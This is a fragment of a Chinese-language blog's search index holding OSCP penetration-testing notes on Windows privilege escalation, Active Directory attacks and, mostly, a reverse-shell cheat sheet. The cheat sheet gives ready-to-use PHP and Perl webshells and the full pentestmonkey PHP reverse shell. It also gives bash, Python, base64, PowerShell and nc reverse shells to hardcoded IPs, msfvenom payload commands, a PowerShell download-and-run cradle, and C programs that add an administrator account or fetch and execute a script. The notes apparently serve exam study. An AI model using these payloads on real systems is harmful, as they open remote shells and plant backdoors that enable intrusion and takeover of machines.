\u0026#34;root.txt\u0026#34; afbc5bd4b615a60648cec41c6ac9253 GUI下的身份切换 runas /user:backupadmin cmd C盘写入提权 systeminfo c:\\windows\\system32\\wbem tzres.dll msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=135 -f dll -o tzres.dll ","permalink":"https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/","summary":"\u003cp\u003e提权检查项目：注意细心！！！！！！！！！！一切异常情况\u003c/p\u003e\n\u003cp\u003e目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator\u003c/p\u003e\n\u003cp\u003e1、计划任务，配合手动可以查看下次运行时间\n2、服务，查看是否具备重启服务或者自动运行重启计算机的权限\n3、DLL劫持去看软件目录日志吧\n4、不可相信命令查看的软件列表，需要手动慢慢看\n5、注意WINPEASS的输出，可能存在明文的密码\n6、内核提权不多，重点在于特权提权\n7、一些特殊的软件或者目录，keepass2\\putty\\\u003c/p\u003e\n\u003ch1 id=\"信息收集\"\u003e信息收集\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estart /b 程序  后台运行\ncmd /k start 后台运行\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看管理员用户组：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e本地\nnet localgroup administrators\n\n获取所有组\nnet localgroup\nGet-LocalGroup\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e用户添加：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enet group site_admin awallace /add /domain\n\n进阶操作：\nnet user cxk cxk123! /add /domain   添加用户进域\nnet group 组名 用户名 /add 添加用户到组\nnet localgroup \u0026#34;Remote Management Users\u0026#34; cxk /add  添加到远程管理组\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看当前用户所属组：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ewhoami /groups\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过注册表查看已经安装了的软件：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e64位：\nGet-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; | select displayname\n\n32位：\nGet-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; | select displayname\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过目录查看安装软件情况：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eC:\\Program Files (x86)\nC:\\Program Files\n\\AppData\\Roaming\\\n\nC:\\Users\\cxk\\AppData\\Roaming\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e正在运行的进程：\u003c/p\u003e","title":"windows 提权"},{"content":"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block\nPHP: 1、webshell代码： \u0026lt;?php system($_REQUEST[\u0026#39;a\u0026#39;]);?\u0026gt; 使用方式： ?a=id \u0026lt;?php system($_GET[\u0026#39;a\u0026#39;]);?\u0026gt; 使用方式： \u0026amp;a=id \u0026lt;?php echo system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 如果有拦截，可以尝试以下代码： \u0026lt;?=`$_GET[0]`?\u0026gt; 2、反弹shell代码： \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.254.128/8888 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.45.205/4444 0\u0026gt;\u0026amp;1\u0026#34; 3、php代码 \u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.10.16.12\u0026#39;; // You have changed this $port = 8888; // And this $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } // Change to a safe directory chdir(\u0026#34;/\u0026#34;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won\u0026#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process\u0026#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } // If we can read from the process\u0026#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } // If we can read from the process\u0026#39;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we\u0026#39;ve daemonised ourself // (I can\u0026#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \u0026#34;$string \u0026#34;; } } ?\u0026gt; 4、命令执行 \u0026lt;?php system(\u0026#34;whoami\u0026#34;);?\u0026gt; 本地自带的phpwebshell:\nlocate php-reverse-shell.php\n/usr/share/webshells/php/php-reverse-shell.php /usr/share/webshells/php/simple-backdoor.php\njava payload ${script:javascript:java.lang.Runtime.getRuntime().exec(\u0026#39;/bin/bash -c bash$IFS$9-i\u0026gt;\u0026amp;/dev/tcp/192.168.45.185/4444\u0026lt;\u0026amp;1\u0026#39;)} 此处可信任burp的编码，CyberChef不可 /bin/bash -c bash$IFS$9-i\u0026gt;\u0026amp;/dev/tcp/192.168.45.223/4444\u0026lt;\u0026amp;1 /bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.119.3/4444 0\u0026gt;\u0026amp;1\u0026#34; NC: nc可用链接： https://github.com/int0x33/nc.exe/blob/master/nc.exe windows： C:\\windows\\temp\\nc.exe -e cmd.exe 10.10.16.6 8888 CGI pl后缀的webshell： 使用方式：webshell.pl?password=yourpassword\nuse CGI; use Cwd; print CGI::header( -type =\u0026gt; \u0026#39;text/html\u0026#39; ); my $command = CGI::param(\u0026#39;command\u0026#39;); my $pwd = CGI::param(\u0026#39;pwd\u0026#39;) || \u0026#39;\u0026#39;; my $password = CGI::param(\u0026#39;password\u0026#39;); my $filename = CGI-\u0026gt;script_name() ; if ( $password ne \u0026#39;yourpassword\u0026#39; ) { print \u0026#34;Please provide a valid password.\\n\u0026#34;; exit(0) } $pwd = $pwd eq \u0026#39;\u0026#39; ? `pwd` : $pwd; my $home = Cwd::cwd(); chdir($pwd); my $result=\u0026#39;\u0026#39;; if ($command =~ /^cd\\s*(.*)/) { my $dir = $1 or \u0026#39;\u0026#39;; if ($dir eq \u0026#39;\u0026#39;) { chdir($home); } else { chdir($dir); } $pwd = Cwd::cwd(); $result = `ls -la`; } else { $result = `$command`; } print \u0026lt;\u0026lt;EOF; \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;meta content=\u0026#34;text/html; charset=ISO-8859-1\u0026#34; http-equiv=\u0026#34;content-type\u0026#34;\u0026gt;\u0026lt;title\u0026gt;console\u0026lt;/title\u0026gt; \u0026lt;script\u0026gt; window.onload = function(){ document.getElementById(\u0026#34;command\u0026#34;).focus(); } \u0026lt;/script\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .wide1 { border-width: thick; width: 100%; height: 600px; } .wide2 { setFocus; border-width: thick; width: 100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;p\u0026gt; Script: $filename PWD: $pwd \u0026lt;br/\u0026gt; \u0026lt;textarea class=\u0026#34;wide1\u0026#34; readonly=\u0026#34;readonly\u0026#34; cols=\u0026#34;1\u0026#34; rows=\u0026#34;1\u0026#34; name=\u0026#34;result\u0026#34;\u0026gt; $result \u0026lt;/textarea\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;get\u0026#34; action=\u0026#34;$filename\u0026#34; name=\u0026#34;command\u0026#34;\u0026gt;Command: \u0026lt;input class=\u0026#34;wide2\u0026#34; name=\u0026#34;command\u0026#34; id=\u0026#34;command\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; value=\u0026#34;$password\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;pwd\u0026#34; value=\u0026#34;$pwd\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; EOF exit 0; python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.5.104\u0026#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]); base64 echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==\u0026#34; | base64 -d | bash msfvenom msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=8889 -f aspx msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=7766 -f elf \u0026gt; rootshell msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f war \u0026gt; shell.war msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw \u0026gt; shell.jsp /usr/share/webshells/php/php-reverse-shell.php /usr/share/webshells/php/simple-backdoor.php msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.214 LPORT=445 -f war \u0026gt; /home/kali/Desktop/shell.war congfig后缀的木马 https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/\nhttps://github.com/0xPurpl3john/web.config\n这个后缀在IIS7.0以上是可以getshell的\n修改项目里面的参数即可\nseclists字典： sudo apt -y install seclists\nhttps://github.com/danielmiessler/SecLists/\n/usr/share/seclists/Fuzzing/extensions-skipfish.fuzz.txt\npowershell 通过powershell创建反向shell连接：\npowershell -nop -c \u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;\u0026#39;10.10.16.5\u0026#39;\u0026#39;,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data | Out-String );$sendback2 = $sendback + \u0026#39;\u0026#39;PS \u0026#39;\u0026#39; + (pwd).Path + \u0026#39;\u0026#39;\u0026gt; \u0026#39;\u0026#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u0026#34; https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3\n$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;192.168.45.168\u0026#39;,8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \u0026#34;. { $data } 2\u0026gt;\u0026amp;1\u0026#34; | Out-String ); $sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() powershell -enc +base64调用\npowershell Unicode+base64加密：\n$text = \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://38.147.171.208:80/a\u0026#39;))\u0026#34; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text), \u0026#39;InsertLineBreaks\u0026#39;) aspx: https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx asp：\nhttps://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/webshell#log-poisoning--lfi--shell 手搓EXE： 安装编译器：\nsudo apt install mingw-w64 报错解决方法：\n32位的编译：\ni686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32 addusr.c\n#include \u0026lt;stdlib.h\u0026gt; int main () { int i; i = system (\u0026#34;net user dave2 password123! /add\u0026#34;); i = system (\u0026#34;net localgroup administrators dave2 /add\u0026#34;); return 0; } 64位的编译：\nx86_64-w64-mingw32-gcc adduser.c -o adduser.exe 反弹shell.exe:\n#include \u0026lt;stdlib.h\u0026gt; int main () { int i; i = system (\u0026#34;powershell.exe -nop -w hidden -c IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.159:81/81_6543.ps1\u0026#39;)\u0026#34;); return 0; } nc 正向shell： nc -lvp 8888 -e /bin/bash nc -lvp 8890 -e cmd.exe ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E5%8F%8D%E5%BC%B9shell/","summary":"\u003cp\u003e\u003ca href=\"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block\"\u003ehttps://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"php\"\u003ePHP:\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1、webshell代码：\n\u0026lt;?php system($_REQUEST[\u0026#39;a\u0026#39;]);?\u0026gt;\n使用方式：\n?a=id\n\n\u0026lt;?php system($_GET[\u0026#39;a\u0026#39;]);?\u0026gt;\n使用方式：\n\u0026amp;a=id\n\n\u0026lt;?php echo system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\n\n如果有拦截，可以尝试以下代码：\n\u0026lt;?=`$_GET[0]`?\u0026gt;\n\n2、反弹shell代码：\n\u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.254.128/8888 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt;\n                bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.45.205/4444 0\u0026gt;\u0026amp;1\u0026#34;\n\n3、php代码\n\n  \u0026lt;?php\n  // php-reverse-shell - A Reverse Shell implementation in PHP\n  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\n  set_time_limit (0);\n  $VERSION = \u0026#34;1.0\u0026#34;;\n  $ip = \u0026#39;10.10.16.12\u0026#39;;  // You have changed this\n  $port = 8888;  // And this\n  $chunk_size = 1400;\n  $write_a = null;\n  $error_a = null;\n  $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;;\n  $daemon = 0;\n  $debug = 0;\n\n  //\n  // Daemonise ourself if possible to avoid zombies later\n  //\n\n  // pcntl_fork is hardly ever available, but will allow us to daemonise\n  // our php process and avoid zombies.  Worth a try...\n  if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n    \n    if ($pid == -1) {\n      printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;);\n      exit(1);\n    }\n    \n    if ($pid) {\n      exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n      printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;);\n      exit(1);\n    }\n\n    $daemon = 1;\n  } else {\n    printit(\u0026#34;WARNING: Failed to daemonise.  This is quite common and not fatal.\u0026#34;);\n  }\n\n  // Change to a safe directory\n  chdir(\u0026#34;/\u0026#34;);\n\n  // Remove any umask we inherited\n  umask(0);\n\n  //\n  // Do the reverse shell...\n  //\n\n  // Open reverse connection\n  $sock = fsockopen($ip, $port, $errno, $errstr, 30);\n  if (!$sock) {\n    printit(\u0026#34;$errstr ($errno)\u0026#34;);\n    exit(1);\n  }\n\n  // Spawn shell process\n  $descriptorspec = array(\n    0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;),  // stdin is a pipe that the child will read from\n    1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;),  // stdout is a pipe that the child will write to\n    2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;)   // stderr is a pipe that the child will write to\n  );\n\n  $process = proc_open($shell, $descriptorspec, $pipes);\n\n  if (!is_resource($process)) {\n    printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;);\n    exit(1);\n  }\n\n  // Set everything to non-blocking\n  // Reason: Occsionally reads will block, even though stream_select tells us they won\u0026#39;t\n  stream_set_blocking($pipes[0], 0);\n  stream_set_blocking($pipes[1], 0);\n  stream_set_blocking($pipes[2], 0);\n  stream_set_blocking($sock, 0);\n\n  printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;);\n\n  while (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n      printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;);\n      break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n      printit(\u0026#34;ERROR: Shell process terminated\u0026#34;);\n      break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process\u0026#39;s STDIN\n    if (in_array($sock, $read_a)) {\n      if ($debug) printit(\u0026#34;SOCK READ\u0026#34;);\n      $input = fread($sock, $chunk_size);\n      if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;);\n      fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process\u0026#39;s STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n      if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;);\n      $input = fread($pipes[1], $chunk_size);\n      if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;);\n      fwrite($sock, $input);\n    }\n\n    // If we can read from the process\u0026#39;s STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n      if ($debug) printit(\u0026#34;STDERR READ\u0026#34;);\n      $input = fread($pipes[2], $chunk_size);\n      if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;);\n      fwrite($sock, $input);\n    }\n  }\n\n  fclose($sock);\n  fclose($pipes[0]);\n  fclose($pipes[1]);\n  fclose($pipes[2]);\n  proc_close($process);\n\n  // Like print, but does nothing if we\u0026#39;ve daemonised ourself\n  // (I can\u0026#39;t figure out how to redirect STDOUT like a proper daemon)\n  function printit ($string) {\n    if (!$daemon) {\n      print \u0026#34;$string\n\u0026#34;;\n    }\n  }\n\n  ?\u0026gt; \n\n4、命令执行\n\n\u0026lt;?php system(\u0026#34;whoami\u0026#34;);?\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e本地自带的phpwebshell:\u003c/p\u003e","title":"反弹shell"},{"content":"wget 批量下载文件：\n#!/bin/bash # 设置起始和结束日期 start_date=\u0026#34;2020-01-01\u0026#34; end_date=\u0026#34;2020-01-31\u0026#34; # 初始化当前日期为起始日期 current_date=\u0026#34;$start_date\u0026#34; # 循环，直到当前日期等于当前系统日期 while [ $current_date != $(end_date) ]; do # 构建下载链接 url=\u0026#34;http://10.10.10.248/Documents/$current_date-upload.pdf\u0026#34; # 输出正在下载的链接 echo \u0026#34;Downloading $url\u0026#34; # 使用 wget 下载文件 wget \u0026#34;$url\u0026#34; # 递增日期 current_date=$(date -I -d \u0026#34;$current_date + 1 day\u0026#34;) done 批量读取文件创建者信息：\nexiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userlist exiftool *.jpg | grep -i Author | cut -d \u0026#34;:\u0026#34; -f 2 | cut -d \u0026#34; \u0026#34; -f 2,3 \u0026gt; authors 将所有pdf文件转换成txt文件：\nfor f in *pdf; do pdftotext $f; done 查看所有文件的第一行：\nhead -n1 *txt kali安装wps\nsudo dpkg -i wps.dep windows 目录：\nC:\\windows\\temp\\ C:\\windows\\system32\\spool\\drivers\\color\\ 根据用户名自动生成字典：\nhttps://github.com/urbanadventurer/username-anarchy 命令如下：会自动生成.或者拼接的大部分字典，但是没有_的 username-anarchy/username-anarchy -i authors \u0026gt;usernames 如果要生成_或者其他自定义格式的吗，参考下面这条命令，其中anna_key便是格式形式： username-anarchy/username-anarchy -i authors -F \u0026#34;anna_key\u0026#34;\u0026gt;usernames ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/","summary":"\u003cp\u003ewget 批量下载文件：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#!/bin/bash\n\n# 设置起始和结束日期\nstart_date=\u0026#34;2020-01-01\u0026#34;\nend_date=\u0026#34;2020-01-31\u0026#34;\n\n# 初始化当前日期为起始日期\ncurrent_date=\u0026#34;$start_date\u0026#34;\n\n# 循环，直到当前日期等于当前系统日期\nwhile [ $current_date != $(end_date) ]; do\n    # 构建下载链接\n    url=\u0026#34;http://10.10.10.248/Documents/$current_date-upload.pdf\u0026#34;\n    \n    # 输出正在下载的链接\n    echo \u0026#34;Downloading $url\u0026#34;\n    \n    # 使用 wget 下载文件\n    wget \u0026#34;$url\u0026#34;\n    \n    # 递增日期\n    current_date=$(date -I -d \u0026#34;$current_date + 1 day\u0026#34;)\ndone\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e批量读取文件创建者信息：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eexiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userlist\nexiftool *.jpg | grep -i Author | cut -d \u0026#34;:\u0026#34; -f 2 | cut -d \u0026#34; \u0026#34; -f 2,3 \u0026gt; authors\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e将所有pdf文件转换成txt文件：\u003c/p\u003e","title":"另类技巧"},{"content":"一、获取立足身份凭证 1、LDAP匿名信息泄露： 配合windapsearch.py获取域内用户信息：\n① 可能存在密码泄露；\n② 可获取用户名，配合AS-REP Roasting破解；\n③ 密码喷洒，记得使用可获取密码策略，可使用crackmapexec爆破smb协议，不直接爆破kerberos\n2、SMB+HTTP+LDAP信息收集 ① SMB注意共享目录，如果存在当前身份无法访问的目标，大概率是要切换身份，目前推荐使用工具为impacket的smbclient.py，网上下载的即可\n② HTTP目前遇到直接getshell的少，但是SQL注入、文件包含的多，甚至需要代码审计\n③ 信息收集方面，注意姓+名的用户名生成方式，收集员工、组织、邮箱等方式，LDAP匿名和有身份的情况下查找的信息可能存在不一样（名字组合：首字母姓+名、姓.名、姓_名、姓首字母.名字）\n④ NTLM relay的攻击不在少数，如打印机、sqlserver等情况可以考虑操作\n二、提权思路 以下方式一般为优先级按个执行\n1、Bloodhound bloodhound基本能识别大部分默认的权限组织和权限滥用的提权，如：委派、DCSync、组织、ACL滥用、一些特殊组等，如果没有直接的提权方式，基本也是可以梳理一下思路的。\n2、winpeass winpeass说实话，直接帮忙提权的点在域内很少，但是它可以帮忙提取很多信息，比如GPP组策略、一些配置信息等，如果当真有直接提权点，那也相当好了。\n具体提权漏洞，见windows操作[[windows提权]]\n3、组信息 查看当前用户是否存在一些不太常见的组信息，比如：LDAP_Readers、ReadGMSAPassword等\n4、密码获取 当前主机的软件密码，使用LaZagne即可，可能存在不匹配，建议多尝试。\n5、kerberoasting 我认为在进行信息收集后就可以尝试，因为该攻击的操作算作比较简单\n6、ADCS证书攻击 在目标主机开放80和https的情况下，很有可能存在证书攻击，CVE-2022-26923、CVE-2021-42287、错误的ADCS模板\n7、白银票据 如果在一些特殊情况下，可以获得服务账户密码的情况下可以尝试登录服务，如sqlserver，使用pip 安装的mssqlclient甚至可以执行命令\n8、域内漏洞 我认为该方式一般为没有方法的情况下进行尝试，因为这种方式没有明显特征：\n① MS14-068\n② Netlogon\n","permalink":"https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/","summary":"\u003ch1 id=\"一获取立足身份凭证\"\u003e一、获取立足身份凭证\u003c/h1\u003e\n\u003ch2 id=\"1ldap匿名信息泄露\"\u003e1、LDAP匿名信息泄露：\u003c/h2\u003e\n\u003cp\u003e配合windapsearch.py获取域内用户信息：\u003c/p\u003e\n\u003cp\u003e① 可能存在密码泄露；\u003c/p\u003e\n\u003cp\u003e② 可获取用户名，配合AS-REP Roasting破解；\u003c/p\u003e\n\u003cp\u003e③ 密码喷洒，记得使用可获取密码策略，可使用crackmapexec爆破smb协议，不直接爆破kerberos\u003c/p\u003e\n\u003ch2 id=\"2smbhttpldap信息收集\"\u003e2、SMB+HTTP+LDAP信息收集\u003c/h2\u003e\n\u003cp\u003e① SMB注意共享目录，如果存在当前身份无法访问的目标，大概率是要切换身份，目前推荐使用工具为impacket的smbclient.py，网上下载的即可\u003c/p\u003e\n\u003cp\u003e② HTTP目前遇到直接getshell的少，但是SQL注入、文件包含的多，甚至需要代码审计\u003c/p\u003e\n\u003cp\u003e③ 信息收集方面，注意姓+名的用户名生成方式，收集员工、组织、邮箱等方式，LDAP匿名和有身份的情况下查找的信息可能存在不一样（名字组合：首字母姓+名、姓.名、姓_名、姓首字母.名字）\u003c/p\u003e\n\u003cp\u003e④ NTLM relay的攻击不在少数，如打印机、sqlserver等情况可以考虑操作\u003c/p\u003e\n\u003ch1 id=\"二提权思路\"\u003e二、提权思路\u003c/h1\u003e\n\u003cp\u003e以下方式一般为优先级按个执行\u003c/p\u003e\n\u003ch2 id=\"1bloodhound\"\u003e1、Bloodhound\u003c/h2\u003e\n\u003cp\u003ebloodhound基本能识别大部分默认的权限组织和权限滥用的提权，如：委派、DCSync、组织、ACL滥用、一些特殊组等，如果没有直接的提权方式，基本也是可以梳理一下思路的。\u003c/p\u003e\n\u003ch2 id=\"2winpeass\"\u003e2、winpeass\u003c/h2\u003e\n\u003cp\u003ewinpeass说实话，直接帮忙提权的点在域内很少，但是它可以帮忙提取很多信息，比如GPP组策略、一些配置信息等，如果当真有直接提权点，那也相当好了。\u003c/p\u003e\n\u003cp\u003e具体提权漏洞，见windows操作[[windows提权]]\u003c/p\u003e\n\u003ch2 id=\"3组信息\"\u003e3、组信息\u003c/h2\u003e\n\u003cp\u003e查看当前用户是否存在一些不太常见的组信息，比如：LDAP_Readers、ReadGMSAPassword等\u003c/p\u003e\n\u003ch2 